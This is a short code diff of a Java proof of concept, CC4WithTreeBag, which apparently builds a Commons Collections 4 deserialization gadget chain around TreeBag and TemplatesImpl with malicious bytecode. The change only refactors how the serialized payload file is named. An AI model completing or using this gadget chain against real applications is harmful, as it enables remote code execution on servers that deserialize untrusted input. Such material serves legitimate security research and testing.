@@ -14,8 +14,6 @@ import java.lang.reflect.Field;
  */
 public class CC4WithTreeBag {
 
-	public static String fileName = "CC4WithTreeBag.bin";
-
 	public static void main(String[] args) throws Exception {
 
 		// 生成包含恶意类字节码的 TemplatesImpl 类
@@ -34,7 +32,7 @@ public class CC4WithTreeBag {
 		field.setAccessible(true);
 		field.set(transformer, "newTransformer");
 
-		SerializeUtil.writeObjectToFile(tree, fileName);
-		SerializeUtil.readFileObject(fileName);
+		SerializeUtil.writeObjectToFile(tree);
+		SerializeUtil.readFileObject();
 	}
 }
